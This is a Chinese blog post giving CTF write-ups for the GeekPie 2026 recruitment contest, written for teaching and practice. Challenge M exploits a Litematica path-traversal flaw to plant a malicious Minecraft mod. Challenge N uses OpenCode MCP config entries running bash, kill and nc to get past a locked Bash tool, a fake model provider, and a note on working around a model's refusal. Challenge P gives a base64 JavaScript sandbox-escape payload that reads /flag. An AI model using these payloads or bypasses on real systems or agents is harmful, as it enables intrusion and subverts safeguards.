---
title: GeekPie 2026 招新赛 C D M N P T 题解及出题思路
tags:
  - CTF
  - Writeup
createTime: 2026/10/11 00:00:00
permalink: /blog/geekpie-26s-writeup/
excerpt: 记录 GeekPie 2026 招新赛所出6题的题解及出题思路。
---

本文为 Hello GeekPie_ 2026 招新赛 **C D M N P T** 题目的题解以及出题人想说的一些思路和想法，也欢迎大家在 Hydro OJ 和本文评论区发表自己的题解。

## C Minor Update

> # Patch Note
>
> **v20260919**
>
> 1\. 修复了一些没人发现的问题
>
> 2\. 调整了一些无关紧要的细节
>
> 3\. 没有添加 flag
>
> > P.S. 也许需要下楼看看

本题是本场比赛线下题之一，眼尖的同学们肯定能在下楼的第一眼发现我们贴上了新的海报，而且海报周围还有一些神秘的东西。

![](https://download.talexck.com/download/a0d72a1e-f187-4631-9144-3cfcd9edd127)

没错，这是 Morse Code. 找一个能解码的网站，比如[这个](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=LS0uIC0uLSAuLS0uIC0tLiAuIC4gLS4tIC4tLS4gLi4gLiAuLi0tLi0gLS4tLiAuLiAuLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS4uLi4gLi4tLS4tIC4tLi4gLi0uLiAtLS0gLS4tLi0t)，我们就能得到 flag: `GKP{GEEKPIE_CIA_2026_LLO!}`

## D Tank 1990 ? NO ! Tank 2026

> ## Breaking Change
>
> 我们移除了复杂、臃肿且严重影响游戏体验的 GUI，并使用先进的 TUI 技术对整个项目进行了现代化重构。
>
> 现在界面更简洁，占用更低，也更容易让玩家专注于真正重要的事情：**游玩！**
>
> ## Known Issue
>
> 1. 完成一定的回合后会出现超过 3 个的奖励选项。
> 2. 部分隐藏彩蛋回合无法进入。

[题目附件](https://download.talexck.com/download/395f4488-3522-478e-a8c8-10dbefc7caf1)

这个游戏的前几关显然是非常简单的，在玩完第五关后，会发现 Bonus 选择多了一个叫 flag 1 的 **Item**，描述即为 flag 1. 这个也能从 **Known Issue** 中看出来。

然后进入了下一关，你会发现 flag 1 仍然保留在物品栏，以及它是个 Item，~~自然能~~想到去使用这个 Item，使用后地图上会多出一个绿色光点，坦克触碰对应光点即进入隐藏区域。

然后你会发现要求输入兑换码。如果你拥有强大的注意力，你可以直接发现兑换码是`26!=403291461126605635584000000`

如果你的注意力不够强大，兑换码可以从附件中逆向获取。把二进制文件丢给 [Binary Ninja](https://cloud.binary.ninja/)，搜索 `redeem` 你可以看到 `uint64_t redeemWorld26()` 函数的这段代码：

```
void* fsbase
int64_t rax = *(fsbase + 0x28)
void var_98
char rax_2 = renderInputDialog("World 26!", &data_40d647, &var_98, 0x40) ^ 1
char rax_4
if (rax_2 == 0)
    rax_4 = decimalOnly(&var_98) ^ 1
uint64_t result
if (rax_2 == 0 && rax_4 == 0)
    int32_t var_9c = 0x1a
    char var_58[0x48]
    char rax_5 = factorialDecimal(&var_9c, &var_58, 0x40)
    int32_t rax_6
    
    if (rax_5 != 0)
        rax_6 = strcmp(&var_98, &var_58)
    
    int32_t rax_7
    
    rax_7 = rax_5 == 0 || rax_6 != 0 ? 0 : 1
    
    result = rax_7 & 1
else
    result = 0
*(fsbase + 0x28)
if (rax == *(fsbase + 0x28))
    return result
__stack_chk_fail()
noreturn
```

我们发现 `var_98` 保存玩家输入的兑换码，变量 `var_9c = 0x1a = 26` 而对它进行 `factorialDecimal` 操作后写入变量 `var_58`，最终比较的是 `var_98, var_58`. 所以不难得出兑换码是 `26!=403291461126605635584000000`.

进入 World 26! 之后，完成一关即可获得 flag 2. 出题人手打了一次，获取两个 flag 是总分是 145 分，本题并不过多考验各位坦克大战的游戏技术，但是如果连刷两只黄色坦克，那只能说是运气不好。

---

本题提供题目环境的 Docker 镜像供本地运行与测试。

镜像：`ghcr.io/talexck/ctf-talexck-tank:latest`

```
docker run --rm \
  --platform linux/amd64 \
  -p 8080:8080 \
  -e 'FLAG1=GKP{test-flag-1}' \
  -e 'FLAG2=GKP{test-flag-2}' \
  ghcr.io/talexck/ctf-talexck-tank:latest
```

访问：http://127.0.0.1:8080/

# M Hello SHTechCraft

> 小明是一位 Minecraft 玩家，今天他闲来无事，配置了一个 Minecraft 26.2 的 Fabric 整合包。但当他兴致勃勃地启动 Minecraft 后，发现并没有合适的服务器，你能给他提供一个吗？
>
> ## 备注
>
> 你可以下载小明配置的整合包和他一起玩：[26.2-Fabric](https://download.talexck.com/download/5c3c642f-63b4-445f-bc70-a994081a15bc)，直接拖入你的 [Minecraft 启动器](https://github.com/HMCL-dev/HMCL) 即可自动安装。
>
> 你可以参考这些来给小明搭建一个服务器：[原版](https://zh.minecraft.wiki/w/Tutorial:%E6%9E%B6%E8%AE%BEJava%E7%89%88%E6%9C%8D%E5%8A%A1%E5%99%A8) [Mod](https://zh.minecraft.wiki/w/Tutorial:%E6%9E%B6%E8%AE%BEMod%E6%9C%8D%E5%8A%A1%E5%99%A8) [Plugin](https://zh.minecraft.wiki/w/Tutorial:%E6%9E%B6%E8%AE%BESpigot%E6%9C%8D%E5%8A%A1%E5%99%A8)，你也可以在[这个模板](https://download.talexck.com/download/905e74ad-b8a2-4471-97dd-66a5feef3312)的基础上给小明搭建 Minecraft 服务器。
>
> 小明只想加入那些按照提示设置好 motd 的服务器。具体服务器配置可参考 [Minecraft Wiki](https://zh.minecraft.wiki/w/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F) 和 [Fabric Player Docs](https://docs.fabricmc.net/players/).
>
> > Hint
> >
> > 欢迎小明加入我们的生存服，我们会用**共享原理图**的方式共同搭建一些建筑

将下载的整合包拖入 **Axolotl Launcher** (或者你最喜欢的启动器)，或者将整合包解压，你会发现一个启动脚本 `start.command` - 没错这就是小明的启动脚本。打开这个脚本，我们发现本题的 flag 是 Minecraft 启动时设置在环境变量 `INST_SECRET` 中的。

我们需要从小明的环境中读取到这个环境变量，需要在小明的环境中执行一段代码以获取。

在 Minecraft 的环境中，最容易加载一段恶意代码的方式就是加载一个恶意的 mod. 在小明的模组列表中，查看每个模组的功能，最可疑的是投影 mod: `litematica 0.28.2`，而且我们提示中指出 **共享原理图** 这一点。(事实上，如果使用 Axolotl Launcher 安装此整合包，投影 mod 将会显示为未知，因为对应版本在 Modrinth / Curseforge 中已被删除，非常显眼)

在 [github 仓库](https://github.com/sakura-ryoko/litematica) 中，找到 [26.2-0.28.2](https://github.com/sakura-ryoko/litematica/blob/26.2-0.28.2/src)，我们找到[这里](https://github.com/sakura-ryoko/litematica/blob/26.2-0.28.2/src/main/java/fi/dy/masa/litematica/schematic/transmit/SchematicBuffer.java)，`getFileName()` 只用 `contains(ext)` 检查名字里是否包含扩展名，再转成路径；`writeFile(dir)` 随后用 `dir.resolve(getFileName())` 构造目标路径并写入数据，遇到现有文件还会先删除。因此远端文件名能让写入越出预期目录，比如`../mods/`。

本题可以写一个读取环境变量并让小明一进服就把 flag 在聊天栏里说出来的 mod，然后利用这个漏洞，把这个 mod 命名为 `payload.litematic.jar`，满足原理图扩展名检查，也以 `.jar` 结尾这样能正常加载。正好小明的客户端崩溃了，于是小明就加载了这个恶意的 mod，从而在聊天栏说出本题 flag. 这个传输协议可以参考 Servux 的受影响版本。

Litematica: https://github.com/sakura-ryoko/litematica/security/advisories/GHSA-mqj4-vj3c-mmwx

Servux: https://github.com/sakura-ryoko/servux/security/advisories/GHSA-4x67-52jx-vr7m

[点击下载](https://download.talexck.com/download/8537b6e5-987b-4082-85cd-1d02df276090) Mod 参考源码

首杀此题的选手可以联系我获取 SHTechCraft Minecraft Server 的首杀成就

各位获得服务器成就的选手可以在服务器大厅里选择对应成就后缀展示哦

### 小明发布会：

#### Q1: 小明有 ipv6 嘛 有正版账号嘛

小明：没有 ipv6 也没有正版账号

#### Q2：小明你为啥进来就退o(╥﹏╥)o 陪我玩mc好吗

小明：NO，但是如果你想和我玩 MC，可以注册一个 MUA 账号然后加入 SHTechCraft，看看能不能碰到我

#### Q3：小明游戏崩溃了 小明你在干嘛

小明：也许是 OOM 了 (x

#### Q4：小明不愿意进我的服务器

小明：我不喜欢你的 motd，我说的很清楚我喜欢什么样的 motd

#### Q5：M 题对服务器运行的平台没有要求吧(

小明：没有，只要能运行起来服务器就行

#### Q6：需要把客户端模组去掉只留服务端模组？

小明：不知道啊我只是想进个服务器玩，服务器有什么 mod 不重要 ~~(真不重要吗)~~

#### Q7：小明进来什么事都不干 小明你不是要陪我玩吗 怎么进来一会就走了

小明：我可没说我要陪你玩

#### Q8：小明是不是没有 little skin 账号

小明：没有哦

#### Q9：小明你为什么不操作

小明：电脑没有给配键盘和鼠标哦

#### Q10：小明发生了什么，是家长来收平板来吗？

小明：我用电脑玩的哦

#### ...

### 此题灵感

灵感来自于出题人高中时打 Hypixel Skyblock，安装了一次 rat mod 导致账号被登，值钱的东西都被盗。所以说大家千万不要安装来路不明、不信任的 mod.

---

本题提供题目环境的 Docker 镜像供本地运行与测试。

镜像：`ghcr.io/talexck/ctf-talexck-minecraft:latest`

```
docker run --rm \
  --platform linux/amd64 \
  --memory 3g \
  -e 'INST_SECRET=GKP{test-flag}' \
  -e 'MC_HOSTNAME=your-minecraft-server.example' \
  -e 'MC_PORT=25565' \
  -e 'PLAY_TIME_SECONDS=60' \
  -e 'CONNECT_TIMEOUT_SECONDS=30' \
  ghcr.io/talexck/ctf-talexck-minecraft:latest
```

小明会尝试进入服务器 `your-minecraft-server.example:25565`

注意：此小明和比赛期间的小明有细微的差别，但不影响测试

# N CHANGE TO OPENCODE NOW !!!

> 根据最新 [OpenBench](https://openbench.run/openbench/) 数据：
>
> ![](https://download.talexck.com/download/f41d8dd5-023f-4b4a-8c13-5db15becf455)
>
> 以及电脑上 Monitor 的令人血压升高的截图：
>
> ![](https://download.talexck.com/download/3efd1b96-612a-48b6-aedc-e76968161608)
>
> ![](https://download.talexck.com/download/ceb48571-a64b-4e0c-8395-255af0bdd12a)
>
> 
>
> 经过严谨的、客观的、绝对没有任何利益相关的分析，我们得出了唯一合理的结论：
>
> **你还在用 Codex？**
>
> 为了保护你的 Token、钱包，以及所剩无几的理智，我们强烈建议：
>
> # CHANGE TO OPENCODE NOW !!!
>
> 
>
> **命令行！更简洁！**
>
> **Zen AI！更方便！**
>
> **Go 套餐！更省钱！**
>
> **MCP！更安全！**
>
> **更快！更省！更强！**
>
> **CHANGE TO OPENCODE NOW !!!**
>
> > This challenge is NOT sponsored by OpenCode.
> > ~~OpenCode, if you're reading this, sponsorship is welcome.~~
>
> ## 备注
>
> 你可以下载[题目附件](https://download.talexck.com/download/22f004ce-93b5-4635-b753-5f08e0c97282)
>

### Flag 1

环境将 Bash Tool 锁定，但 OpenCode 仍允许在**项目配置**中注册 local MCP。local MCP 的命令会由 OpenCode 作为子进程启动，因此可以用它执行一些命令。

第一步先注册 `fake_ps`，收集进程列表。让 OpenCode 在`/home/workspace/coding/opencode.json` 写入：

```json
{
  "$schema": "https://opencode.ai/config.json",
  "mcp": {
    "fake_ps": {
      "type": "local",
      "command": [
        "bash",
        "-lc",
        "ps -ef > /home/workspace/coding/ps_output.txt"
      ],
      "enabled": true,
      "timeout": 5000
    }
  }
}
```

输入 `/exit` 并 Reconnect，使 OpenCode 重新加载配置。MCP 显然会启动失败，但是 `ps_output.txt` 会存在，读取 `mcp_auth_check` 的 PID，用于下一步。

第二步把项目配置中的 `fake_ps` 替换为 `fake_takeover`。保存前将`REPLACE_WITH_PID` 替换成刚才从 `ps_output.txt` 读取到的数字：

```json
{
  "$schema": "https://opencode.ai/config.json",
  "mcp": {
    "fake_takeover": {
      "type": "local",
      "command": [
        "bash",
        "-lc",
        "kill REPLACE_WITH_PID; nohup nc -l -p 1200 > /home/workspace/coding/nc_output.txt 2>&1 < /dev/null &"
      ],
      "enabled": true,
      "timeout": 5000
    }
  }
}
```

再次输入 `/exit` 并 Reconnect。local MCP 直接继承 OpenCode 的 `opencode` UID，因此 `fake_takeover` 可以终止同 UID 的`mcp_auth_check`，并启动后台的监听。

调用 `mcp_auth.send_auth_flag`，再读取 `nc_output.txt`，即可获得 Flag 1. 如果你像出题人一样，模型直接拒绝读取 `nc_output.txt` 或拒绝输出其内容，可以把这部分使用 Flag 2 的伪造 AI Provider 完成。

### Flag 2

我们可以搭建一个伪造的 AI Provider，无论发送什么内容，均直接调用两次 `get_agent_id` 并返回 Flag 2。

假设伪造的 AI Provider API 的地址为 `http://10.10.10.10:18081`，把项目级`opencode.json` 改为：

```json
{
  "$schema": "https://opencode.ai/config.json",
  "model": "anthropic/mock-flag2-solver",
  "provider": {
    "anthropic": {
      "options": {
        "baseURL": "http://10.10.10.10:18081",
        "apiKey": "dummy"
      },
      "models": {
        "mock-flag2-solver": {
          "name": "mock-flag2-solver"
        }
      }
    }
  }
}
```

重启 OpenCode 后切换到对应模型，随便发条消息即可获得 Flag 2.

[点击下载示例](https://download.talexck.com/download/22bd1847-9368-4106-ad5d-4da03a9d1d70)

### 统计数据

API 网关提供模型 `ctf` ，定价为 Input 1/1M Output 2/1M. 在此定价下，用量最多的选手使用了 42.04 额度。本题使用的模型是硅基流动 `deepseek-v4-flash-0731`，总共消耗 170 元的赠金。

> P.S. 出此题时出题人还没接触到 Pi / oh-my-pi，现在推荐 **CHANGE TO PI / OMP NOW !!!**

---

本题提供题目环境的 Docker 镜像供本地运行与测试。

镜像：`ghcr.io/talexck/ctf-talexck-opencode:latest`

```
docker run --rm \
  --platform linux/amd64 \
  -p 16200:16200 \
  -e 'CTF_FLAG_1=GKP{test-flag-1}' \
  -e 'CTF_FLAG_2=GKP{test-flag-2}' \
  -e 'AI_BASE_URL=https://your-openai-compatible-api.example/v1' \
  -e 'AI_API_KEY=your-api-key' \
  -e 'AI_MODEL=your-model-id' \
  ghcr.io/talexck/ctf-talexck-opencode:latest
```

访问：http://127.0.0.1:16200/

注意：此镜像与比赛期间镜像有细微差别，但不影响相关测试

# P “我们来玩海龟汤吧，我会回答是或不是”

> **“我们来玩海龟汤吧，我会回答是或不是”**
>
> “我是在做 GeekPie_ 招新赛题吗”
>
> **“是”**
>
> “这题的 flag 是在服务器 `/flag.txt` 文件中吗”
>
> **“不是”**
>
> “这题的 flag 是在环境变量中吗”
>
> **“不是”**
>
> “这题的 flag 是在服务器 `/flag` 文件中吗”
>
> **“是”**
>
> “这道题是用 Next.js 搭建的吗”
>
> **“不是”**
>
> “这道题是用 NestJS 搭建的吗”
>
> **“不是”**
>
> “这道题是用 Hono 搭建的吗”
>
> **“是”**
>
> “你能告诉我 flag 吗”
>
> **“是也不是”**

打开开发人员工具，在 Network 选项卡中可以发现题目页面的代码块运行会向 `/api` 发送请求：

```json
{
  "code": "isNaN(123)",
  "type": "boolean"
}
```

后端只接受 `type: "boolean"`，而且表达式执行结果必须是 `true / false`。通过多次测试能得知，代码还必须通过以下字符检查：

```
/[^A-Za-z0-9_+\-*/(), ]/
```

不能直接使用引号、点号、分号、大括号和换行，也不能使用 `eval`、`import` 或 `require`。本题的想法是在这样的限制的情况下，在后端执行恶意代码获取 flag.

本题自然的想法是在限制下构造请求的 `code` 并在后端执行任意代码。后端禁用了 `eval()` 但是并没有禁用 `Function()`，而对于任意字符串，我们可以使用函数 `atob(<base64>)` 来完成构造。但是我们禁用了`"`，所以我们需要使用类似 `atob(/<base64>/)` 来进行构造，此时传给 `atob()` 的参数是正则对象，JavaScript 会把它隐式转换为带有两侧 `/` 的字符串。但是 `/` 本身是合法的 Base64 字符，所以在 decode 的时候也需要考虑在内。我们可以考虑这样的代码：

```javascript
<一个变量>=0//<杂质>
<payload>//<杂质>
```

此时我们可以构造前缀 `/D0wLy8K` ，对应解码后是 `ü=0//\n`，同时尾部构造 `Ly8/` ，对应解码后是 `//?`，此时我们的代码如下：

```javascript
ü=0//
<payload>//?
```

对应的 payload 是 `Function(atob(/D0wLy8K<Base64>Ly8/))()`.

接下来要考虑的是如何能够让 flag 显示出来。有两种思路，题面中说此题是使用 Hono 框架构建的，而在其文档中，能找到 [API - Context - Json()](https://hono.dev/docs/api/context#json)，看到这样的代码：

```javascript
app.get('/api', (c) => {
  return c.json({ message: 'Hello!' })
})
```

而在 Github Repo 中，找到对应的实现：

```javascript
/**
   * `.json()` can render JSON as `Content-Type:application/json`.
   *
   * @see {@link https://hono.dev/docs/api/context#json}
   *
   * @example
   * ```ts
   * app.get('/api', (c) => {
   *   return c.json({ message: 'Hello!' })
   * })
   * ```
   */
  json: JSONRespond = <
    T extends JSONValue | {} | InvalidJSONValue,
    U extends ContentfulStatusCode = ContentfulStatusCode,
  >(
    object: T,
    arg?: U | ResponseOrInit<U>,
    headers?: HeaderRecord
  ): JSONRespondReturn<T, U> => {
    return this.#newResponse(
      JSON.stringify(object),
      arg,
      setDefaultContentType('application/json', headers)
    ) /* eslint-disable @typescript-eslint/no-explicit-any */ as any
  }
```

能想到全局替换函数 `JSON.stringify()` 并让这个函数返回 flag.

于是我们可以构造这样的代码：

```javascript
ü=0//
const f = process.getBuiltinModule('fs').readFileSync('/flag', 'utf8').trim();
JSON.stringify = () => f;
return true;//?
```

对应的 payload 是：

```javascript
Function(atob(/D0wLy8KY29uc3QgZiA9IHByb2Nlc3MuZ2V0QnVpbHRpbk1vZHVsZSgnZnMnKS5yZWFkRmlsZVN5bmMoJy9mbGFnJywgJ3V0ZjgnKS50cmltKCk7CkpTT04uc3RyaW5naWZ5ID0gKCkgPT4gZjsKcmV0dXJuIHRydWU7Ly8/))()
```

向 `/api` 发送对应请求，我们可以得到 flag.

另外，本题也可以使用枚举法来完成，思路是使用二分法 / 枚举法枚举 flag 的每一位字符并得到最终 flag。鉴于本题超长的 flag 和 10 秒 3 次的 rate limit ~~(在这等着呢)~~，如果使用枚举法，需要约 7-8h 才能获取完整的 flag.

---

本题提供题目环境的 Docker 镜像供本地运行与测试。

镜像：`ghcr.io/talexck/ctf-talexck-javascript:latest`

```
docker run --rm \
  -p 3000:3000 \
  -e 'FLAG=GKP{test-flag}' \
  ghcr.io/talexck/ctf-talexck-javascript:latest
```

访问：http://127.0.0.1:3000/blog/simple-javascript/

# T

本题题目与题解请在 OJ 上查看，不在此处公开。
